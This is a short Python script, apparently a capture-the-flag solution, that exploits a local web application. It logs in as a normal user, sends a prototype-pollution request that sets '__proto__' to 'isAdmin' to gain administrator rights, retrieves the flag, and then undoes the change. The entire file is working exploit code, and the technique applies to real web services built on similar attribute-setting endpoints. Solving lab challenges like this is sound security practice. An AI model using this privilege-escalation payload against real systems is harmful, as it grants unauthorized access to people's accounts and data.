# %%
import requests
import json

# %% Helper functions
def prettyPrint(response: requests.Response):
    print(json.dumps(response.json(), indent=4))

def rawPrint(response: requests.Response, name: str = None, printMore: bool = False):
    if name:
        print(f"--- {name} ---")
    print(f"Status code: {response.status_code}")
    if printMore:
        print(f"Headers: {response.headers}")
        print(f"Cookies: {response.cookies}")
    print(f"Content: {response.text}\n")

baseURL = "http://localhost:3000" # this is globally set for all requests (yeah ugly ^^)

# %% login as user that you created in the web ui
def login():
    url = f"{baseURL}/user/login?username=user&password=user"
    response = requests.request("GET", url)
    rawPrint(response, "login")

    auth_token = response.json()["auth_token"]
    return auth_token

# %%  set isAdmin to true (after this the login will be broken until we disable isAdmin)
def enableAdmin(auth_token: str):
    url = f"{baseURL}/enableAttribute?attribute=__proto__&value=isAdmin"
    headers = {"Authorization": auth_token}
    response = requests.request("GET", url, headers=headers)
    rawPrint(response, "enableAdmin")


# %% get flag
def getFlag(auth_token: str):
    url = f"{baseURL}/flag"
    headers = {"Authorization": auth_token}
    response = requests.request("GET", url, headers=headers)
    
    rawPrint(response, "getFlag")
    flag = response.text
    return flag

# %% check enabled attributes
def checkEnabledAttributes(auth_token: str):
    url = f"{baseURL}/enabledAttributes"
    headers = {"Authorization": auth_token}
    response = requests.request("GET", url, headers=headers)
    rawPrint(response, "checkEnabledAttributes")

# %% disable isAdmin to allow refreshing the token
def disableAdmin(auth_token: str):
    url = f"{baseURL}/disableAttribute?attribute=__proto__&value=isAdmin"
    headers = {"Authorization": auth_token}
    response = requests.request("GET", url, headers=headers)
    rawPrint(response, "disableAdmin")

# %% doing the exploit
auth_token = login()

try:
    enableAdmin(auth_token)
    flag = getFlag(auth_token)
finally:
    disableAdmin(auth_token)

checkEnabledAttributes(auth_token)

print(f"Flag: {flag}")